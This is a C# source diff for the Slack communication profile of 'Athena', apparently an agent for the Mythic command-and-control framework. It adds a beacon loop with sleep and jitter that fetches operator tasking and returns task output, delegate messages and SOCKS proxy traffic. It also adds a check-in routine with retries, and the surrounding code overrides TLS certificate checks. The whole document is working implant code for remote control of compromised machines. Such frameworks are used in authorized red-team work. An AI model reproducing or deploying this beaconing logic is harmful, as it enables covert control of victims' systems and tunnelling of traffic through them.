@@ -19,31 +19,20 @@ using System.Text.Json;
 using System.Text.Json.Serialization;
 using System.Net.Http.Headers;
 using System.Diagnostics;
+using Athena.Models.Athena.Commands;
+using Athena.Models.Mythic.Checkin;
+using Athena.Models.Mythic.Response;
+using Athena.Models.Mythic.Tasks;
+using Athena.Commands;
 
 namespace Athena
 {
-    public class Config : IConfig
+    public class Slack : IProfile
     {
         public IProfile profile { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-
-        public Config()
-        {
-            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
-            this.killDate = kd;
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
-            this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
-            this.jitter = jitter;
-            this.profile = new Slack();
-
-        }
-    }
-
-    public class Slack : IProfile
-    {
         public string uuid { get; set; }
         public bool encrypted { get; set; }
         public PSKCrypto crypt { get; set; }
@@ -57,7 +46,12 @@ namespace Athena
         public string proxyHost { get; set; }
         public string proxyPass { get; set; }
         public string proxyUser { get; set; }
+        private int currentAttempt = 0;
+        private int maxAttempts = 10;
         private string agent_guid = Guid.NewGuid().ToString();
+        private CancellationTokenSource cts = new CancellationTokenSource();
+        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
+
         private SlackWebApiClient client { get; set; }
 
         public Slack()
@@ -73,7 +67,12 @@ namespace Athena
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
             this.uuid = "%UUID%";
-
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
+            this.sleep = sleep;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            this.jitter = jitter;
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
                    new RemoteCertificateValidationCallback(
@@ -245,7 +244,6 @@ namespace Athena
 
             }
         }
-
         private async Task DeleteMessages(List<string> messages)
         {
             // This works for the current implemenation but may have to change in the event I need to further chunk messages.
@@ -337,6 +335,86 @@ namespace Athena
             }
             Debug.WriteLine($"[{DateTime.Now}] Returning {messages.Count} messages.");
             return messages;
+        }
+        public async Task StartBeacon()
+        {
+            while (!cts.Token.IsCancellationRequested)
+            {
+                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
+                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
+                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
+                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
+                await Task.WhenAll(responseTask, delegateTask, socksTask);
+
+                List<string> responses = await responseTask;
+
+                GetTasking gt = new GetTasking()
+                {
+                    action = "get_tasking",
+                    tasking_size = -1,
+                    delegates = await delegateTask,
+                    socks = await socksTask,
+                    responses = responses,
+                };
+                try
+                {
+                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
+
+                    if (String.IsNullOrEmpty(responseString))
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                    if (gtr == null)
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    this.currentAttempt = 0;
+
+                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+
+                    this.SetTaskingReceived(this, tra);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
+                    this.currentAttempt++;
+                }
+
+                if (this.currentAttempt >= this.maxAttempts)
+                {
+                    this.cts.Cancel();
+                }
+            }
+        }
+        public async Task<bool> StopBeacon()
+        {
+            this.cts.Cancel();
+            return true;
+        }
+        public async Task<CheckinResponse> Checkin(Checkin checkin)
+        {
+            int maxAttempts = 3;
+            int currentAttempt = 0;
+            do
+            {
+                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
+
+                if (!string.IsNullOrEmpty(res))
+                {
+                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                }
+                currentAttempt++;
+            } while (currentAttempt <= maxAttempts);
+
+            return new CheckinResponse()
+            {
+                status = "failed"
+            };
         }
     }
 
